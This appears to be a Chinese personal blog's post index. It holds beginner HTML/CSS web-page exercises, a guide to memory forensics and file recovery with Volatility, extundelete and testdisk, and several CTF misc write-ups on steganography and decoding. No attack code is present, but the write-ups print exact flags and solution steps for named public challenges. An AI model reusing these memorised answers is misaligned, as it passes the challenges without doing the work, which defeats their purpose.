&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&#x2F;&gt;    &lt;title&gt;Ginkgo_Login&lt;&#x2F;title&gt;    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;admin.css&quot;&gt;    &lt;style&gt;        body&#123;            margin:0px;        &#125;        div#container&#123;            width:100%;            height:750px;            background-color: #34495e;        &#125;        div#header&#123;            width:100%;            height: 30%;            background-color: #34495e;        &#125;        div#menu&#123;            width:60%;            height:67%;            background-color: #F5B041;        &#125;        div#content&#123;            width:40%;            height: 67%;            background-color: white;        &#125;        div#footer&#123;            width:100%;            height:3%;            background-color: gray;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div id&#x3D;&quot;container&quot;&gt;    &lt;div id&#x3D;&quot;header&quot; align&#x3D;&quot;middle&quot; &gt;        &lt;img src&#x3D;&quot;image&#x2F;MiniGoldLogo.png&quot; width&#x3D;&quot;200px&quot; height&#x3D;&quot;120px&quot;&gt;        &lt;span&gt;&lt;h1 style&#x3D;&quot;color: white&quot;&gt;Welcome,admin&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;    &lt;&#x2F;div&gt;    &lt;div id&#x3D;&quot;menu&quot; style&#x3D;&quot;float:left;&quot;&gt;        &lt;?php dosth();?&gt;    &lt;&#x2F;div&gt;    &lt;div id&#x3D;&quot;content&quot; style&#x3D;&quot;float:right;&quot;&gt;        &lt;form class&#x3D;&quot;box&quot; action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;admin.php&quot; method&#x3D;&quot;post&quot;&gt;            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;goto&quot; value&#x3D;&quot;goto&quot;&gt;        &lt;&#x2F;form&gt;    &lt;&#x2F;div&gt;    &lt;div id&#x3D;&quot;footer&quot; style&#x3D;&quot;clear:both;text-align:center;&quot;&gt;        ©版权所有&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n尝试添加重复用户时\n\n删除该用户\n\n\n删无可删时\n\n查\n\n\n目前的效果是笔者相对满意的，下一步优化页面想把第二页的输入变得更加美观。加油吧\n\n","tags":["WEB"]},{"title":"web2","url":"/2020/12/05/web2/","content":"第二个网页\n\n学习中。。。目前只有单个页面而已，逐步完善。\n\n\n这回尝试了诸多网站都有的瀑布流界面和2D转3D的效果。\n\n网页上半部分效果：\n\n下半部分：\n\n瀑布流收起时：\n\n跳转部件：\n\nhtml👇\n&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;1&lt;&#x2F;title&gt;    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;1.css&quot;&gt;    &lt;script src&#x3D;&quot;jquery-3.5.1.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script&gt;        $(document).ready(function ()&#123;            $(&quot;button&quot;).click(function ()&#123;                $(&quot;.container&quot;).slideToggle();            &#125;);        &#125;);    &lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;div class&#x3D;&quot;header&quot;&gt;        &lt;div class&#x3D;&quot;header_in&quot;&gt;            &lt;ul&gt;                &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;导航1&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;导航2&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;导航3&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;导航4&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;            &lt;&#x2F;ul&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;div class&#x3D;&quot;body&quot;&gt;        &lt;div class&#x3D;&quot;body_img&quot;&gt;            &lt;img src&#x3D;&quot;7798741b48729a099104646bf233b024.jpg&quot; alt&#x3D;&quot;views&quot; width&#x3D;99% height&#x3D;&quot;432&quot;&gt;        &lt;&#x2F;div&gt;        &lt;div class&#x3D;&quot;body_tie&quot;&gt;            &lt;p&gt;&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp撒哈拉沙漠（Sahara Desert）形成于约250万年前，是世界最大的沙质荒漠，面积约932万平方千米，位于非洲北部。该地区气候条件非常恶劣，是地球上最不适合生物生存的地方之一。                &lt;br&#x2F;&gt;&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp撒哈拉”是阿拉伯语的音译，在阿拉伯语中“撒哈拉”为大沙漠，源自当地游牧民族图阿雷格人的语言，原意即为“大荒漠”。&lt;&#x2F;p&gt;        &lt;&#x2F;div&gt;        &lt;button class&#x3D;&quot;btn&quot;&gt;切换&lt;&#x2F;button&gt;        &lt;div class&#x3D;&quot;container&quot;&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;eeb95d8a71d90e7b847b700c0ffbfd67.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;e82ec0210acbfba7063c787a03eda506.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;e7b656314cd9a0beb79a51f0b9136216.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;d02eefd30b12f4717d4c249649f79c06.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;bf3b9d8249271403aed9993cace7f2c0.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;a70091ef2a72c369f348de13521d746e.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7798741b48729a099104646bf233b024.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;653218b0cb31b22da1f627dbf3d3b5f9.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7d9aca9ae095f6549d7b3c1bd61d82d6.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;109a814ee4299c91ff87c13a5434546b.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;000082b0c35a01843ffb1d645f5cb60b.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;81ddf0d4bffda51660eda0ed0149893a.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;46b6da2cea2facb43332ba218a93d0f4.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;40f929199b1299e2df94a0882678a571.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;9bcfb04909e0c4829bbd921f30aef4a0.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7d9aca9ae095f6549d7b3c1bd61d82d6.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;109a814ee4299c91ff87c13a5434546b.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;653218b0cb31b22da1f627dbf3d3b5f9.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7798741b48729a099104646bf233b024.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;a70091ef2a72c369f348de13521d746e.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;81ddf0d4bffda51660eda0ed0149893a.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;000082b0c35a01843ffb1d645f5cb60b.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7d9aca9ae095f6549d7b3c1bd61d82d6.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;109a814ee4299c91ff87c13a5434546b.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;653218b0cb31b22da1f627dbf3d3b5f9.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7798741b48729a099104646bf233b024.jpg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;a70091ef2a72c369f348de13521d746e.jpeg&quot;&gt;&lt;&#x2F;div&gt;            &lt;div&gt;&lt;img src&#x3D;&quot;7d9aca9ae095f6549d7b3c1bd61d82d6.jpeg&quot;&gt;&lt;&#x2F;div&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;div class&#x3D;&quot;footer&quot;&gt;        &lt;ul&gt;            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;关于我们&amp;nbsp&amp;nbsp|&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;加入我们&amp;nbsp&amp;nbsp|&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;联系我们&amp;nbsp&amp;nbsp|&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;帮助中心&amp;nbsp&amp;nbsp|&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;        &lt;&#x2F;ul&gt;    &lt;&#x2F;div&gt;    &lt;div class&#x3D;&quot;footer_2d&quot;&gt;        &lt;a href&#x3D;&quot;#&quot;&gt;UP&lt;&#x2F;a&gt;    &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\ncss👇\nbody&#123;    margin:0;&#125;.header&#123;    background-color: bisque;    width: 100%;    height: 50px;&#125;.header_in&#123;    background-color: #F5B041;    width: 80%;    height: 50px;    margin-left: 10%;    margin-right: 10%;&#125;ul&#123;    list-style-type: none;    padding: 10px;    width:100%;    margin:0;&#125;.header_in a:link&#123;    text-decoration: none;    color: aliceblue;    width: 50px;&#125;.header_in a:visited &#123;    text-decoration: none;    color: aliceblue;    width: 50px;&#125;.header_in a:hover&#123;    background-color: #191919;&#125;li&#123;    display: inline;    padding:3px;    padding-left: 5px;    padding-right: 5px;    font-size: 20px;    font-weight: bold;&#125;.body&#123;    margin-top: 10px;    background-color: #F5B041;    height:auto;    margin-left: 10%;    margin-right: 10%;&#125;.body_tie&#123;    height: 70px;    font-family: 华文琥珀;&#125;.btn&#123;    position: relative;    left: 90%;&#125;.container &#123;    background-color: coral;    &#x2F;*瀑布流效果*&#x2F;    column-width: 200px;    -webkit-column-width: 200px;    -webkit-column-gap: 5px;    column-gap:5px;&#125;.container div&#123;&#125;.container img&#123;    width: 200px;    margin: 5px 0;&#125;.text&#123;    font-size:12px;    margin-bottom: 5px;&#125;.footer&#123;    margin-top: 10px;    background-color: #F5B041;    width: 80%;    height:auto;    margin-left: 10%;    margin-right: 10%;    text-align: center;&#125;.footer a:link&#123;    text-decoration: none;    color: #191919;    width: 50px;&#125;.footer a:visited &#123;    text-decoration: none;    color: #191919;    width: 50px;&#125;.footer_2d&#123;    color: #FFFFFF;    background-color: #F5B041;    font-size: 25px;    position: absolute;    right: 15px;    bottom: -150px;    width: 50px;    height: 50px;    -webkit-transition: width 2s,height 2s,-webkit-transform 2s;    transition: width 2s,height 2s,transform 2s;&#125;.footer_2d:hover&#123;    width: 70px;    height: 70px;    transform: rotate(360deg);    -webkit-transform: rotate(360deg);&#125;\n","tags":["WEB"]},{"title":"内存取证和文件恢复常见操作","url":"/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/","content":"内存取证和文件恢复常见操作\n\n常用工具\n\nVolatility\nElcomsoft Forensic Disk Decryptor\nEasyRecovery\nMedAnalyze\nFTK\n\n内存\n\n分析进程、内存数据\n提取分析指定进程的特定内存数据\n\nVMDK\n\n本质上是物理硬盘的虚拟版，也会存在跟物理硬盘的分区和扇区类似的填充区域，可以利用这些填充区域把我们需要隐藏的数据进行处理，从而避免文件增加VMDK文件的大小，也可避免由于VMDK文件大小的改变所带来的可能导致虚拟机错误的问题。\n\n磁盘\n常见的磁盘分区格式：\n\nWindows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS\nLinux:EXT2-&gt;EXT3-&gt;EXT4\n\n以【[HDCTF2019]你能发现什么蛛丝马迹吗】展开\n查看系统版本\n# volatility -f memory.img imageinfo\n\n查看进程\n# volatility -f memory.img --profile&#x3D;Win2003SP0x86 pslist\n\n针对Win2003SP0x86产生报错，故排除这个镜像\n# volatility -f memory.img --profile&#x3D;Win2003SP1x86 pslist\n\n根据时间可以发现DumpIt.exe有东西\n与该命令相似的为\n# volatility -f memory.img --profile&#x3D;Win2003SP2x86 pstree\n不同点在于pstree顾名思义显示的是进程树，表明了各进程之间的从属关系。\n\n而\n# volatility -f memory.img --profile&#x3D;Win2003SP2x86 psscan\n则更加全面地进行了扫描，从而显示出被隐藏的进程，如病毒等\n\n将内存中的某个进程数据以 dmp 的格式保存出来\n# volatility -f memory.img --profile&#x3D;Win2003SP2x86 memdump -p 1992 --dump-dir&#x3D;.&#x2F;\n以【[V&amp;N2020 公开赛]内存取证】展开\n通过上述内存取证起手式得到系统版本\n查看进程\nvolatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist\n\n关注\nTrueCrypt.exe 3364notepad.exe 3552mspaint.exe 2648#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;\n依次处理\n1）notepad=&gt;editbox\nvolatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox\n\n2）mspaint=&gt;Gimp\nhttps://www.gimp.org/downloads/\n不断调节位移、宽度和高度，\n\n出现【1YxFCQ6goYBF6Q】\n3）TrueCrypt=&gt;Elcomsoft Forensic Disk Decryptor\nDecrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount\n\n\n发现多了个F盘，其中存在key\nuOjFdKu1jsbWI8N51jsbWI8N5\n得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法\n此处注意需要勾选TrueCrypt\n\n得到fffflag.zip\n以【[XMAN2018排位赛]file】展开\nextundelete恢复原理：\n在linux下可以通过“ls -id”来查看某个文件或者目录的inode值，\n~&#x2F;桌面# ls -id &#x2F; 2 &#x2F;\n从而得到桌面的innode值为2\n而当使用extundelete来恢复文件时并不依赖特定的文件格式，\n首先extundelete会通过文件的inode信息来获得当前文件系统下所有文件的信息，包括文件名和inode，包括已存在的和删除的文件。\n再通过inode信息结合日志去查询该inode所在的block位置，包括直接块、间接块等信息。\n最后利用dd命令将这些信息备份出来，从而恢复数据文件。\nextundelete attachment.img --restore-all\n\n以【[BSidesSF2019]diskimage】展开\n前期通过zsteg分离出png中的数据后，利用testdisk进行分析。\ntestdisk disk.dat\n一路回车\n\n\n\n选择最不同的那一个，根据提示进行copy，得到flag\n关于testdisk的(中文版官方指南)[https://www.cgsecurity.org/wiki/Testdisk_操作指南#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B]有更加深入的功能解说和详细用法\n","tags":["MISC","取证"]},{"title":"美团CTF初+决","url":"/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/","content":"美团CTF初+决\n团队第九\n\nDifferent_Puzzle\n得到null.vhd\n用360压缩打开\n直接拖出来\n得到69张图片，1个flag.exe\n后缀名vhd，用取证大师打开\n根据\n\nhttps://github.com/jschicht/UsnJrnl2Csv\n找到日志，\n\n得到对应的png\n通过PS拼接得到\n\n扫描条形码得到【EuO9&amp;cDH】\n\n注：此处有个大坑，若用一向以精确度闻名的支付宝扫码的话，会出现只能识别一半的情况，反倒是QQ能得到准确的内容【EuO9&amp;cDH】\n运行flag.exe得到flag\n\nflag{af26d693-2de2-4b16-be49-d95e83a43f76}\nMISC_CP\n预览图看到蓝色部分的二维码\nforemost后\n\n扫描得到\n\n11-8437-f2c73bf76c16}\n另一半flag为lsb隐写\njava -jar Stegsolove.jar\n在Blue plane 6时得到汉信码\n\n中国编码APP\n\nflag{d4dce746-7f13-47\nflag值：flag{d4dce746-7f13-4711-8437-f2c73bf76c16}\n","tags":["challenge"]},{"title":"MISC-2","url":"/2021/01/16/MISC-2/","content":"simple\n\n21\n\n\n得到的 flag 请包上 flag{} 提交。\n\n长见识了\ncs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home\nhttps://www.calormen.com/jslogo/\n通过这个网站能得到画出来的LOGO\nRCTF_HeyLogo\n22\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢天璇战队供题。\n天璇战队平台：http://ctf.merak.codes/\n\n人傻了\n\nMRCTF&#123;Why_4re_U_5o_ShuL1an??&#125;\n23\n\n\n得到的 flag 请包上 flag{} 提交。来源：https://github.com/hebtuerror404/CTF_competition_warehouse_2018\n\n常规解码\n题目内容：\na2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg&#x3D;&#x3D;\nbase64\nkanbbrgghjl&#123;zb____&#125;vtlaln\n栅栏\nkzna&#123;blnl_abj_lbh_trg_vg&#125;\n凯撒\nxman&#123;oyay_now_you_get_it&#125;\n24\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到一张图【小姐姐.png】，一个加密压缩包【decode.zip】，一个文件夹【read】\n【read】里为哈利波特的英文，猜测可能是词频统计\n【decode.zip】有提示，\nFLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,\n计算得该式子为7，尝试压缩包密码【7NNULLULL,】不对，尝试掩码攻击，得到密码【2019456NULLULL,】(一开始没有加逗号人都傻了)\n得到一串替换密码\n接下来分析图片\nforemost分离出一张一样的图片，对比无果，尝试盲水印攻击，得到一张图片，提示下一步应该对11.txt操作\n对11.txt进行词频统计\nfrom collections import Counterf &#x3D; open(&quot;file.txt&quot;)txt &#x3D; f.read()c &#x3D; Counter()for i in txt:    c[i] &#x3D; c[i]+1print(c)\nCounter(&#123;&#39; &#39;: 75435, &#39;e&#39;: 39628, &#39;t&#39;: 27993, &#39;a&#39;: 25887, &#39;o&#39;: 25809, &#39;n&#39;: 21337, &#39;r&#39;: 20990, &#39;h&#39;: 19535, &#39;i&#39;: 19422, &#39;s&#39;: 18870, &#39;d&#39;: 15932, &#39;l&#39;: 14385, &#39;\\x80&#39;: 12130, &#39;u&#39;: 9562, &#39;y&#39;: 8293, &#39;g&#39;: 8127, &#39;w&#39;: 7744, &#39;m&#39;: 6729, &#39;f&#39;: 6431, &#39;c&#39;: 6403, &#39;.&#39;: 6136, &#39;\\xe3&#39;: 6065, &#39;,&#39;: 5658, &#39;b&#39;: 4980, &#39;p&#39;: 4909, &#39;&quot;&#39;: 4758, &#39;k&#39;: 3930, &quot;&#39;&quot;: 3141, &#39;\\n&#39;: 3033, &#39;H&#39;: 2996, &#39;v&#39;: 2716, &#39;-&#39;: 1990, &#39;I&#39;: 1393, &#39;T&#39;: 1055, &#39;S&#39;: 844, &#39;?&#39;: 754, &#39;A&#39;: 703, &#39;D&#39;: 685, &#39;M&#39;: 665, &#39;R&#39;: 660, &#39;W&#39;: 653, &#39;P&#39;: 639, &#39;G&#39;: 492, &#39;N&#39;: 488, &#39;!&#39;: 474, &#39;F&#39;: 426, &#39;x&#39;: 381, &#39;B&#39;: 348, &#39;O&#39;: 332, &#39;Y&#39;: 326, &#39;j&#39;: 319, &#39;C&#39;: 293, &#39;E&#39;: 287, &#39;z&#39;: 259, &#39;q&#39;: 217, &#39;L&#39;: 209, &#39;Q&#39;: 203, &#39;U&#39;: 193, &#39;V&#39;: 192, &#39;;&#39;: 135, &#39;K&#39;: 79, &#39;:&#39;: 69, &#39;J&#39;: 51, &#39;)&#39;: 33, &#39;(&#39;: 30, &#39;1&#39;: 11, &#39;3&#39;: 8, &#39;4&#39;: 6, &#39;0&#39;: 5, &#39;Z&#39;: 5, &#39;7&#39;: 4, &#39;9&#39;: 4, &#39;2&#39;: 3, &#39;*&#39;: 2, &#39;5&#39;: 2, &#39;X&#39;: 2, &#39;\\t&#39;: 1, &#39;6&#39;: 1, &#39;8&#39;: 1, &#39;\\\\&#39;: 1, &#39;~&#39;: 1&#125;)\n由于decode.txt只对小写字母操作，进行排序\netaonrhisdluygwmfcbpkvz\n注：以下操作为WP内容，非笔者本人（笔者本人运行不出“正确”结果，持保留意见\n对照decode.txt得\nQW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D;&#x3D;\nbase64\nAo(mgHY?i2ARAkQB5_^!?Y!Sj0ms\nbase85\nflag&#123;have_a_good_day1&#125;\n25\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢天璇战队供题。\n天璇战队平台：http://ctf.merak.codes/\n\n这道题算是杂糅在一起，不过并不难\n得到【JM.png】【Look_at_the_file_ending.wav】【win-win.zip】\n提示得这么明显了，查看音频末尾，\nU2FsdGVkX1&#x2F;nSQN+hoHL8OwV9iJB&#x2F;mSdKk5dmusulz4&#x3D;\n以为是3DES，需要密钥\n分离JM.png\n得到压缩包，名为AES的Tokyo图片\n至此，加密方式，密钥都是已知的。\n开干叭\nAES解密\nCCGandGulu\n解开加密压缩包\n得到Ending.wav\n这里用到一个多媒体隐写工具SlientEye\ndecode得\nMRCTF&#123;Th1s_is_the_3nd1n9&#125;\n26\n\n\n压缩包密码是加密过的\n\n得到一张扭曲的二维码，还原得\n\n天天PS我真是：）\n\n\n扫码得【base（gkctf)】\n根据提示，存在压缩包，对图片进行分离，果然得到了。\n将明文通过base58加密后得到CfjxaPF，解开\n得名为1的文件和flag3.png\n图片不知道咋说啥，先处理1里的内容\neval(function(p,a,c,k,e,d)&#123;e&#x3D;function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c&#x2F;a)))+((c&#x3D;c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#39;&#39;.replace(&#x2F;^&#x2F;,String))&#123;while(c--)d[e(c)]&#x3D;k[c]||e(c);k&#x3D;[function(e)&#123;return d[e]&#125;];e&#x3D;function()&#123;return&#39;\\\\w+&#39;&#125;;c&#x3D;1;&#125;;while(c--)if(k[c])p&#x3D;p.replace(new RegExp(&#39;\\\\b&#39;+e(c)+&#39;\\\\b&#39;,&#39;g&#39;),k[c]);return p;&#125;(&#39;15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17&#x3D;&quot;n&quot;12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17&#x3D;&quot;n&quot;12 13&#x3D;0 15 n 14 a b c d e f g h i j 10 11 16&#x3D;&quot;n&quot;13&#x3D;$((13+1))12 1g(&quot;1f&#x3D;\\&#39; \\&#39;;1e&#x3D;\\&#39;&quot;\\&#39;;16&#x3D;\\&#39;#\\&#39;;1j&#x3D;\\&#39;(\\&#39;;1i&#x3D;\\&#39;)\\&#39;;1h&#x3D;\\&#39;.\\&#39;;1a&#x3D;\\&#39;;\\&#39;;19&#x3D;\\&#39;&lt;\\&#39;;18&#x3D;\\&#39;&gt;\\&#39;;1d&#x3D;\\&#39;1c\\&#39;;1b&#x3D;\\&#39;&#123;\\&#39;;1k&#x3D;\\&#39;&#125;\\&#39;;1t&#x3D;\\&#39;0\\&#39;;1u&#x3D;\\&#39;1\\&#39;;1s&#x3D;\\&#39;2\\&#39;;1r&#x3D;\\&#39;3\\&#39;;1n&#x3D;\\&#39;4\\&#39;;1m&#x3D;\\&#39;5\\&#39;;1l&#x3D;\\&#39;6\\&#39;;1q&#x3D;\\&#39;7\\&#39;;1p&#x3D;\\&#39;8\\&#39;;1o&#x3D;\\&#39;9\\&#39;;&quot;)&#39;,62,93,&#39;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db&#39;.split(&#39;|&#39;),0,&#123;&#125;))\njs解密得\nfor n in a b c d e f g h i j k l m n o p q r s t u v w x y z do eval An &#x3D; &quot;n&quot;donefor n in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z do eval An &#x3D; &quot;n&quot;done num &#x3D; 0for n in a b c d e f g h i j do eval Bn &#x3D; &quot;n&quot;num &#x3D; $((num + 1)) done alert(&quot;Bk&#x3D;&#39; &#39;;Bm&#x3D;&#39;&quot;&#39;;Bn&#x3D;&#39;# &#39;;Bs&#x3D;&#39; (&#39;;Bt&#x3D;&#39;)&#39;;By&#x3D;&#39;.&#39;;Cb&#x3D;&#39;;&#39;;Cc&#x3D;&#39; &lt; &#39;;Ce&#x3D;&#39; &gt; &#39;;Cl&#x3D;&#39;_ &#39;;Cn&#x3D;&#39; &#123;\t&#39;;Cp&#x3D;&#39;&#125;&#39;;Da&#x3D;&#39;0 &#39;;Db&#x3D;&#39;1 &#39;;Dc&#x3D;&#39;2 &#39;;Dd&#x3D;&#39;3 &#39;;De&#x3D;&#39;4 &#39;;Df&#x3D;&#39;5 &#39;;Dg&#x3D;&#39;6 &#39;;Dh&#x3D;&#39;7 &#39;;Di&#x3D;&#39;8 &#39;;Dj&#x3D;&#39;9 &#39;;&quot;)\n根据flag3.png对应得到Aa=a;Ab=b等Bk=’ ‘;Bm=’&quot;‘;Bn=’#‘等Cb=’;Cc='&lt;'等Da=‘0’;Db='1’等\n#include &lt;stdio.h&gt;int main()&#123;    print(&quot;w3lc0me_4o_9kct5&quot;);    ……&#125;\n得到flag\nw3lc0me_4o_9kct5\n27\n\n\n得到的 flag 请包上 flag{} 提交。\n\n打开看了一波，没啥发现。\ndocx常规做法，更改后缀为.zip\n在/word/media中发现flag\nutflag&#123;unz1p_3v3ryth1ng&#125;\n\n果然是unzip everything哈哈哈\n\n28\n\n\n派大星最近很苦恼，因为它的屁股上出现了一道疤痕！我们拍下了它屁股一张16位位图，0x22，0x44代表伤疤两种细胞，0xf0则是派大星的赘肉。还原伤疤，知道是谁打的派大星！(答案为32位的一串字符串) 注意：得到的 flag 请包上 flag{} 提交\n\n给了一张粉色的图片，丢进010editor查看，根据提示，找到0x22,0x44的部分\n&quot;DD&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;&quot;DD&quot;DD&quot;&quot;D&quot;&quot;DDD&quot;&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;D&quot;&quot;&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D